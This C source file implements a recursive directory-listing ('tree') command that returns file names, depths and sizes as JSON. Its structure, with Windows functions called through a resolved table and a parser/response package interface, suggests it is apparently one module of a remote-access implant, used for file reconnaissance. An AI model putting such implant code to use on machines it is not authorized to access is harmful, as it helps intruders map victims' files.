#include "config.h"
#ifdef INCLUDE_CMD_TREE

#include "commands.h"
#include "json_out.h"

static JSON_BUF g_tjb;
static DWORD g_t_count;

static void _tree_walk(PINSTANCE inst, const char* dir, DWORD depth, DWORD max_depth) {
    if (depth > max_depth) return;
    char search[512];
    int p = 0;
    for (; dir[p] && p < 255; p++) search[p] = dir[p];
    if (p > 0 && search[p-1] != '\\') search[p++] = '\\';
    search[p++] = '*'; search[p] = 0;

    WIN32_FIND_DATAA fd;
    HANDLE h = inst->Win32.FindFirstFileA(search, &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        if (fd.cFileName[0] == '.' && (fd.cFileName[1] == 0 || fd.cFileName[1] == '.')) continue;
        char indent[64];
        int ip = 0;
        for (DWORD d = 0; d < depth && ip < 60; d++) { indent[ip++] = ' '; indent[ip++] = ' '; }
        indent[ip] = 0;

        if (g_t_count) j_append_raw(&g_tjb, ",");
        j_append_raw(&g_tjb, "{\"name\":\"");
        j_append_raw(&g_tjb, indent);
        j_append_str(&g_tjb, fd.cFileName);
        j_append_raw(&g_tjb, "\",\"depth\":");
        j_append_uint(&g_tjb, depth);
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            j_append_raw(&g_tjb, ",\"is_dir\":true}");
            char full[512];
            int fp = 0;
            for (; dir[fp] && fp < 255; fp++) full[fp] = dir[fp];
            if (fp > 0 && full[fp-1] != '\\') full[fp++] = '\\';
            for (int i = 0; fd.cFileName[i] && fp < 510; i++) full[fp++] = fd.cFileName[i];
            full[fp] = 0;
            g_t_count++;
            _tree_walk(inst, full, depth + 1, max_depth);
        } else {
            j_append_raw(&g_tjb, ",\"is_dir\":false,\"size\":");
            ULONGLONG sz = ((ULONGLONG)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
            j_append_u64(&g_tjb, sz);
            j_append_raw(&g_tjb, "}");
            g_t_count++;
        }
    } while (inst->Win32.FindNextFileA(h, &fd));
    inst->Win32.FindClose(h);
}

VOID cmd_tree(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD dir_len = 0, depth_len = 0;
    char* dir = parser_string(args, &dir_len);
    char* depth_s = parser_string(args, &depth_len);

    char base[256] = {0};
    int bp = 0;
    if (dir && dir_len > 0) { for (; dir[bp] && bp < 255; bp++) base[bp] = dir[bp]; }
    else { base[0] = '.'; base[1] = 0; }
    base[bp] = 0;

    DWORD max_depth = 3;
    if (depth_s && depth_len > 0) {
        DWORD v = 0;
        for (DWORD i = 0; depth_s[i] >= '0' && depth_s[i] <= '9'; i++)
            v = v * 10 + (depth_s[i] - '0');
        if (v > 0 && v <= 10) max_depth = v;
    }

    j_init(&g_tjb);
    j_append_raw(&g_tjb, "{\"tree\":[");
    g_t_count = 0;
    _tree_walk(inst, base, 0, max_depth);
    j_append_raw(&g_tjb, "],\"count\":");
    j_append_uint(&g_tjb, g_t_count);
    j_append_raw(&g_tjb, ",\"base\":");
    j_append_str(&g_tjb, base);
    j_append_raw(&g_tjb, "}");
    package_add_bytes(inst, response, (BYTE*)g_tjb.buf, g_tjb.len);
}

#endif
